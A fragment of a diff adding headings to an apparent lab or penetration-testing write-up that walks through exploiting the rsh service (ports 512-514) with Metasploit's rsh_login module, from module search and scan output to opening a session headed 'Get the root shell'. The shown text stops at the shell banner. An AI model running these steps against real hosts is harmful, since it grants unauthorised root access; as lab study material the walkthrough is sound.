@@ -1,5 +1,7 @@
+## 512/513/514 rsh_login Exploitation
 <pre>514/tcp  open  tcpwrapped</pre>
 
+### RSH_Login
 <pre>msf6 > search rsh_login</pre>
 
 <pre>Matching Modules
@@ -59,6 +61,7 @@ Interact with a module by name or index. For example info 0, use 0 or use auxili
 [*] A.B.C.D:514   - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed</pre>
 
+### Exploit complte add get the active session 
 <pre>msf6 auxiliary(scanner/rservices/rsh_login) > sessions </pre>
 
 <pre>Active sessions
@@ -70,6 +73,7 @@ Interact with a module by name or index. For example info 0, use 0 or use auxili
 
 <pre>msf6 auxiliary(scanner/rservices/rsh_login) > sessions 1</pre>
 
+## Get the root shell
 <pre>[*] Starting interaction with 1...
 
 Shell Banner:
